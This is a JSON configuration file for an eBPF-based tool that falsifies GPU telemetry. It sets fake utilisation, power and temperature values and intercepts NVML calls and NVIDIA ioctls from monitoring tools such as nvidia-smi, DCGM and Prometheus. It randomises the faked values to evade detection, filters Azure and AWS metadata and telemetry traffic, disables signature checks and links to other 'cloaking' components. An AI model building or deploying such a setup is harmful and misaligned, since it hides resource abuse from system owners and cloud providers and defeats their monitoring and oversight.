{
  "_comment": "eBPF Telemetry Filter Configuration",
  "_description": "Cấu hình cho eBPF-based GPU telemetry filtering system",
  
  "filter_settings": {
    "enable_gpu_filter": true,
    "enable_network_filter": true,
    "enable_logging": true,
    "log_level": "INFO"
  },
  
  "fake_metrics": {
    "_comment": "Fake GPU metrics to inject",
    "fake_gpu_util": 2,
    "fake_mem_util": 5,
    "fake_power": 75,
    "fake_temp": 45,
    "fake_clock": 1200,
    "fake_fan_speed": 30
  },
  
  "network_filtering": {
    "enable_network_filter": true,
    "network_interface": "eth0",
    "block_telemetry": false,
    "modify_payload": true,
    "log_network_events": true,
    "blocked_endpoints": [
      "168.63.129.16",
      "169.254.169.254",
      "10.0.0.1"
    ],
    "blocked_ports": [443, 8080, 9090, 3000, 8125, 8086],
    "telemetry_keywords": ["gpu", "nvml", "dcgm", "nvidia", "utilization", "power"]
  },
  
  "gpu_monitoring_targets": {
    "_comment": "Processes and functions to intercept",
    "target_processes": [
      "nvidia-smi",
      "dcgm",
      "nvtop",
      "gpustat",
      "prometheus",
      "telegraf",
      "collectd"
    ],
    "nvml_functions": [
      "nvmlDeviceGetUtilizationRates",
      "nvmlDeviceGetPowerUsage", 
      "nvmlDeviceGetTemperature",
      "nvmlDeviceGetClockInfo",
      "nvmlDeviceGetMemoryInfo",
      "nvmlDeviceGetPerformanceState"
    ],
    "ioctl_commands": [
      "NV_ESC_RM_CONTROL",
      "NV_ESC_CARD_INFO",
      "NV_ESC_CHECK_VERSION_STR"
    ]
  },
  
  "evasion_strategies": {
    "_comment": "Advanced evasion techniques",
    "randomize_fake_values": true,
    "value_ranges": {
      "gpu_util_range": [1, 5],
      "mem_util_range": [3, 8],
      "power_range": [70, 85],
      "temp_range": [40, 50]
    },
    "time_based_variation": {
      "enable": true,
      "variation_interval_seconds": 30,
      "max_variation_percent": 20
    },
    "process_whitelist": [
      "systemd",
      "kernel",
      "ssh",
      "docker"
    ]
  },
  
  "performance_settings": {
    "_comment": "Performance and resource limits",
    "max_events_per_second": 1000,
    "ring_buffer_size_kb": 256,
    "event_batch_size": 10,
    "cleanup_interval_seconds": 60,
    "max_tracked_processes": 1024
  },
  
  "security_settings": {
    "_comment": "Security and safety configurations",
    "require_root": true,
    "verify_signatures": false,
    "enable_audit_logging": true,
    "max_program_size_kb": 1024,
    "allowed_capabilities": [
      "CAP_SYS_ADMIN",
      "CAP_NET_ADMIN",
      "CAP_BPF"
    ]
  },
  
  "integration": {
    "_comment": "Integration with existing cloaking systems",
    "work_with_time_based_evasion": true,
    "work_with_namespace_isolation": true,
    "work_with_memory_obfuscation": true,
    "priority_order": ["ebpf", "time_based", "namespace", "memory"],
    "fallback_on_failure": true
  },
  
  "debugging": {
    "_comment": "Debug and development settings",
    "enable_debug_mode": false,
    "verbose_logging": false,
    "save_raw_events": false,
    "debug_output_file": "/tmp/ebpf_debug.log",
    "performance_profiling": false
  },
  
  "environment_detection": {
    "_comment": "Auto-detect environment and adjust settings",
    "auto_detect_gpu": true,
    "auto_detect_monitoring_tools": true,
    "auto_adjust_fake_values": true,
    "environment_profiles": {
      "azure_vm": {
        "fake_gpu_util": 3,
        "fake_power": 80,
        "blocked_endpoints": ["168.63.129.16"]
      },
      "aws_ec2": {
        "fake_gpu_util": 2,
        "fake_power": 75,
        "blocked_endpoints": ["169.254.169.254"]
      },
      "bare_metal": {
        "fake_gpu_util": 4,
        "fake_power": 90,
        "blocked_endpoints": []
      }
    }
  }
} 